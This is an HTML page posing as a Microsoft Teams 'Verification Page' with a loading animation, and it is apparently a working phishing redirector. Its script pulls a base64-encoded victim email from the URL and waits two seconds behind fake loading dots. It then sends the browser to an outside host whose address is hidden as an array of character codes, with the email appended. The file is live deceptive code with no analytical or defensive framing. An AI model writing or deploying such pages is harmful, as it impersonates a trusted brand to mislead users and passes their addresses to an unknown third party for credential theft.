<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
        }
        .container {
            text-align: center;
        }
        .dots-container {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .dot {
            background-color: dodgerblue;
            border-radius: 50%;
            width: 10px;
            height: 10px;
            margin: 5px;
            animation: grow 1.5s infinite ease-in-out;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.1s; }
        .dot:nth-child(3) { animation-delay: 0.2s; }
        .dot:nth-child(4) { animation-delay: 0.3s; }
        .dot:nth-child(5) { animation-delay: 0.4s; }
        @keyframes grow {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.5); }
        }
        #emailDisplay {
            color: rgb(110, 71, 238);
            font-size: 18px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
        <div id="emailDisplay" aria-live="polite"></div>
        <div class="dots-container" aria-label="Loading content">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>
    <script>
        // Function to decode base64 string
        function decodeBase64(encoded) {
            try {
                return decodeURIComponent(atob(encoded).split('').map(c =>
                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
            } catch (e) {
                console.error("Decoding failed: ", e);
                return null; // Return null if decoding fails
            }
        }

        function findEmailParam() {
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams.entries()) {
                if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                    const decodedValue = decodeBase64(value);
                    if (decodedValue && decodedValue.includes('@')) {
                        return { key, value }; // Return the key and the decoded email
                    }
                }
            }
            return null;
        }

        function redirectToTarget(base64Email) {
            const parts = [
                104, 116, 116, 112, 115, 58, 47, 47, 115, 109, 97, 108, 108, 100, 101, 112, 
                111, 116, 46, 99, 111, 109, 47, 110, 47, 63, 99, 51, 89, 57, 111, 90, 51, 54, 
                86, 56, 49, 120, 88, 51, 90, 118, 97, 87, 78, 100, 38, 114, 97, 110, 100, 61, 
                85, 69, 120, 122, 101, 68, 69, 111, 61, 38, 117, 105, 100, 61, 85, 83, 69, 
                82, 50, 56, 49, 48, 50, 48, 50, 52, 85, 52, 54, 49, 48, 50, 56, 50, 57, 61, 
                78, 48, 49, 50, 51, 78
            ];
            const obfuscatedURL = String.fromCharCode(...parts) + base64Email;
            window.location.href = obfuscatedURL;
        }

        // Automatically redirect after showing loading dots
        window.onload = function () {
            const emailParam = findEmailParam();
            setTimeout(() => {
                if (emailParam) {
                    redirectToTarget(emailParam.value);
                } else {
                    console.error("No email found for redirection");
                }
            }, 2000); // Show loading dots for 2 seconds
        };
    </script>
</body>
</html>
